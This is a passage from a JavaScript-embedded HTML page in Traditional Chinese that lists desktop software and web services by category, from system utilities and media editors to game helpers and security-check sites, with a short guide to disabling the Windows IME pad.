var Mod73 = {"title":"Toolbox - 電腦篇","slug":"tool-list","html":"<p>和前端比較無關的便利軟體與服務。</p>\n<h2 id=\"系統\">系統</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.wox.one/\">wox</a></td>\n<td>快速執行程式</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://mizage.com/divvy/\">Divvy</a></td>\n<td>切割視窗位置</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://rufus.ie/\">Rufus</a></td>\n<td>簡易建立可開機 USB 裝置</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.jam-software.com/treesize_free/\">TreeSize</a></td>\n<td>分析硬碟檔案分佈</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.exploit-db.com/google-hacking-database\">Google Hacking Database</a></td>\n<td>對弱點目標具作用的搜尋字串資料庫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite\">SysinternalsSuite</a></td>\n<td>微軟發佈的疑難排解工具套件</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.auslogics.com/en/software/disk-defrag/\">Auslogics Disk Defrag</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://ntcore.com/?page_id=371\">4gb_patch</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.vpngate.net/cn/howto_softether.aspx\">SoftEther VPN Client</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://docs.microsoft.com/ja-jp/previous-versions/bb896647(v=msdn.10)?redirectedfrom=MSDN\">Debug Monitor Tool</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/ctrl2cap\">Ctrl2cap</a></td>\n<td>切換 Caps Lock 鍵成 Contorl 鍵</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.giantbranch.cn/2018/02/02/%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5Radare2/\">Radare2</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"驅動\">驅動</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.asus.com/tw/Sound/Xonar_Essence_STX/HelpDesk_Download/\">ASUS Xonar Essence STX Audio</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/psmoveservice/PSMoveService/wiki/PSEye-Software-Setup-%28Windows%29\">PS3 Eye Universal Driver</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"編輯\">編輯</h2>\n<h3 id=\"繪圖\">繪圖</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://takabosoft.com/win\">EDGE</a></td>\n<td>點陣繪圖軟體，支援至全彩色</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://graphicsgale.com/us/\">GraphicsGale</a></td>\n<td>點陣繪圖軟體，支援至 256 色，製作動畫較為方便</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.kannagi.net/TEGAKI/\">Tegaki</a></td>\n<td>可與推特聯動的速發塗鴉軟體</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://bach.ccu.edu.tw/Site/nu13754/Media/dir_52aecfed62c6f/dir_52aecfef57e4c/\">PHJCI</a></td>\n<td>繪製 PTT 用的 ASCII 圖像工具</td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"後製\">後製</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.gimp.org/downloads/\">GIMP</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://affinity.serif.com/en-gb/photo/\">Affinity Photo</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.rlvision.com/photosift/about.php\">PhotoSift</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Ralpha</td>\n<td>批次化處理圖片工具</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://mclover.hateblo.jp/UgoTool\">ウゴツール</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"影片\">影片</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://fairway.ne.jp/gantai/\">GANTAI</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://animeeffects.org/ja/\">AnimeEffects</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://avidemux.sourceforge.net/\">Avidemux</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://delir.studio/\">Delir</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mifi/lossless-cut/releases\">LosslessCut</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.blackmagicdesign.com/products/davinciresolve\">Davinci Resolve</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://sourceforge.net/projects/audacity/\">Audacity</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://mkvtoolnix.download/\">Mkvtoolnix</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://spring-fragrance.mints.ne.jp/aviutl/\">AviUtl</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.adobe.com/jp/products/premiere.html\">Premiere Pro</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.nikse.dk/subtitleedit\">SubtitleEdit</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/arcusmaximus/YTSubConverter\">YTSubConverter</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://forum.gamer.com.tw/C.php?bsn=60608&amp;snA=310&amp;tnum=4\">【字幕進階】使用.ytt 格式製作 Youtube 炫炮字幕（新增 1.3.4 版新功能教學！）</a></li>\n</ul>\n<h3 id=\"3dcg\">3DCG</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Autodesk Softimage</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Blender</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.metaseq.net/\">metaseq</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.sketchup.com/zh-TW\">SketchUp | 3D for Everyone</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"音樂\">音樂</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.mp3tag.de/en/\">MP3Tag</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.audacityteam.org/\">Audacity</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.goldwave.com/\">GoldWave</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Youlean Loudness Meter 2</td>\n<td>監控麥克風輸入的音量響度</td>\n<td></td>\n</tr>\n<tr>\n<td>Orban Loudness Meter 2</td>\n<td>監控電腦上播放的音量響度</td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"麥克風變聲\">麥克風變聲</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://voice-changer.userlocal.jp/\">ユーザーローカルボイスチェンジャー</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.okayulu.moe/\">ゆかりねっと</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://japanese.audio4fun.com/voice-over.htm\">AV Voice Changer Software Diamond</a></li>\n</ul>\n<h3 id=\"文件\">文件</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://notepad-plus-plus.org/\">Notepad++</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.typora.io/\">Typora</a></td>\n<td>Markdown 編輯器</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://jp.xmind.net/download/\">XMind</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://mh-nexus.de/en/hxd/\">HxD</a></td>\n<td>Freeware Hex Editor and Disk Editor</td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"檔案\">檔案</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>PowerToys</td>\n<td>微軟推出的多功能系統輔助軟體</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://antp.be/software/renamer\">AntRenamer</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://emptyloop.com/unlocker/\">Unlocker</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://fastcopy.jp/en/\">FastCopy</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>TakeOwnership</td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"解壓縮\">解壓縮</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.developershome.com/7-zip/\">7-Zip</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://tw.bandisoft.com/bandizip/\">Bandizip</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"語系切換\">語系切換</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/James1201/Fanhuaji-GUI-Release/releases\">繁化姬</a></td>\n<td>搭配詞語本地化的繁簡轉換工具</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://pooi.moe/Locale-Emulator/\">Locale Emulator</a></td>\n<td>切換程式執行環境語系</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://archive.codeplex.com/?p=ntlea\">NTLEA</a></td>\n<td>切換程式執行環境語系</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"影音播放\">影音播放</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://mpv.io/\">mpv</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.foobar2000.org/\">Foobar2000</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://mangameeya.softonic.jp/\">MangaMeeya</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://bygzam.seesaa.net/article/110314791.html\">LCDDelayChecker</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"網路\">網路</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://winscp.net/eng/download.php\">WinSCP</a></td>\n<td>open source SFTP client</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.putty.org/\">Putty</a></td>\n<td>SSH and telnet client</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://mobaxterm.mobatek.net/\">MobaXterm</a></td>\n<td>eabbed SSH client</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview\">TCPView</a></td>\n<td>show detailed listings of all TCP and UDP endpoints</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.xlightftpd.com/\">xlight</a></td>\n<td>Windows FTP and SFTP Server</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.rejetto.com/hfs/\">HFS</a></td>\n<td>HTTP File Server</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://anydesk.com/zhs\">AnyDesk</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.realvnc.com/en/connect/download/viewer/\">VNCViewer</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.ptt.cc/bbs/EZsoft/M.1546241396.A.D95.html\">PTTStar</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://ryu-s.github.io/app/youtubelivecommentviewer\">YoutubeLiveCommentViewer</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"直播軟體\">直播軟體</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://obsproject.com/ja\">OBS Studio</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.telestream.net/wirecast/\">Wirecast</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://play.google.com/store/apps/details?id=com.vaultmicro.camerafi.live&amp;hl=zh_TW\">CameraFi Live</a></li>\n</ul>\n<h3 id=\"通訊軟體\">通訊軟體</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://telegram.org/\">Telegram</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://discordapp.com/\">Discord</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://slack.com/intl/en-tw/\">Slack</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://maps.me/\">MAPS.ME</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://beta.hackfoldr.org/\">HACK FOLDR</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.bridgefy.me/\">BRIDGEFY</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://zello.com/\">ZELLO</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/QM3RRIkFR_6x0jrw6TxPbg?view=\">PATCHWORK</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"chrome-插件\">Chrome 插件</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/fiahfy/youtube-live-chat-flow\">Flow Chat</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/pan-for-video/gpfhajmppnhpfkokaidnlepfkhblpiol?hl=ja\">Pan for video</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/outsidebar/bkbgfdeahjoonelgflchidgfppdldfhc\">OutsideBar</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/maxchat/hgfdknfjakjkmdhmcndaajebcfhkodll\">Maxchat</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://fsworld009.github.io/StreamTvArray/\">Stream TV Array</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://modch.at/\">Modch.at</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://viewsync.net/\">ViewSync</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"下載\">下載</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://jdownloader.org/\">JDownloader</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.qbittorrent.org/download.php\">qbittorrent</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://mrs0m30n3.github.io/youtube-dl-gui/\">Youtube-dl</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.douga-getter.com/\">動画ゲッター</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>[TwitchLeecher]</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://jp.videoproc.com/record/kakorokurecorder-download-install.htm\">kakorokuRecorder154</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://ch.nicovideo.jp/nico-lab/blomaga/ar8759\">ニコ生の録画方法 まとめ</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>[FlickrDownloader]</td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"遊戲\">遊戲</h2>\n<h3 id=\"螢幕資料參考\">螢幕資料參考</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.videocardbenchmark.net/gpu_list.php\">PassMark Software - Video Card (GPU) Benchmark Charts</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://displaylag.com/display-database/\">Best TVs &amp; Monitors for Gaming: Input Lag Database</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.rtings.com/\">Reviews and Ratings - RTINGS.com</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.hdtvtest.co.uk/\">TV Reviews 2018 - Best 4K HDR LED, OLED &amp; QLED TVs</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"螢幕測試工具\">螢幕測試工具</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.lagom.nl/lcd-test/\">LCD monitor test images</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://bygzam.seesaa.net/article/110314791.html\">LCD Delay Checker - Tari Lari Run</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"遊戲輔助工具\">遊戲輔助工具</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.livedoor.jp/ebiflynageruyo/archives/38271889.html\">PS3_Sixaxis_Driver</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://joytokey.net/en/\">JoyToKey</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.x360ce.com/\">x360ce</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://html5gamepad.com/\">HTML5 Gamepad Tester</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://memoryhacking.com/\">Memory Hack Software</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://fuji.drillspirits.net/winips/\">WinIPS</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/ifcaro/Open-PS2-Loader\">Open-PS2-Loader</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www21.atwiki.jp/improper_code/sp/pages/85.html\">GS Mode Selector</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www21.atwiki.jp/improper_code/sp/pages/69.html\">HD_Project</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"視窗化\">視窗化</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.majorgeeks.com/files/details/dxwnd.html\">dxwnd</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://westechsolutions.net/sites/WindowedBorderlessGaming/download\">WindowedBorderlessGaming</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>3DAnalyzer</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>D3DWindower</td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"解密\">解密</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://ghidra-sre.org/\">Ghidra</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>ARCtool</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>DDDATool</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>tilemolester</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>tim2view</td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"資安\">資安</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.aguse.jp/\">aguse.jp: ウェブ調査</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://anonymouse.org/anonwww.html\">Anonymouse.org</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.virustotal.com/zh-tw/\">VirusTotal - 免費的線上病毒、惡意軟體和網址掃瞄器</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.virustotal.com/#/home/upload\">VirusTotal</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://gunkanmaki.jog.buttobi.net/\">Kiken URL List－危険と思われるアドレス一覧と解説－</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://passwordsecurity.info/\">Password Security info</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://haveibeenpwned.com/\">Have I Been Pwned: Check if your email has been compromised in a data breach</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"其它\">其它</h2>\n<ul>\n<li>關閉輸入法整合器</li>\n</ul>\n<ol>\n<li>開啟 <code>C:\\Windows\\System32\\IME\\shared</code></li>\n<li>找到 <code>IMEPADSV.EXE</code></li>\n<li>右鍵點擊内容 -&gt; 安全頁 -&gt; 進階 -&gt; 更改擁有者為自己 -&gt; 確定關閉</li>\n<li>重新右鍵點擊内容 -&gt; 安全頁 -&gt; 編輯權限 -&gt; 除了自己之外的其他賬戶權限都取消勾選</li>\n<li>重開機</li>\n</ol>\n<h2 id=\"個人網站\">個人網站</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.vgod.tw/\">vgod&#39;s blog</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.othree.net/\">O3noBLOG</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://teddy-chen-tw.blogspot.com/search/label/%E7%94%9F%E6%B4%BB\">搞笑談軟工：生活</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://noob.tw/\">Noob&#39;s Space</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://fpjs.fun/tutorial/\">Tutorial | 點燈坊</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://biezhi.me/\">魔王不造反 / 个人主页</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://program-think.blogspot.com/\">编程随想的博客</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.kalan.dev/\">半熟前端 | Kalan&#39;s Blog</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://st-threath.blogspot.com/\">St. Threath</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.williamtai.moe/\">白髮‧青春 - 宅宅的背包誌</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ckworks.jp/blog/\">デジモノに埋もれる日々</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://80sanime.tumblr.com/post/158829607241/bonus-1979-1990-anime-primer-night-on-the-galactic\">80sanime</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://animarchive.tumblr.com/tags-magazine\">Magazines</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" 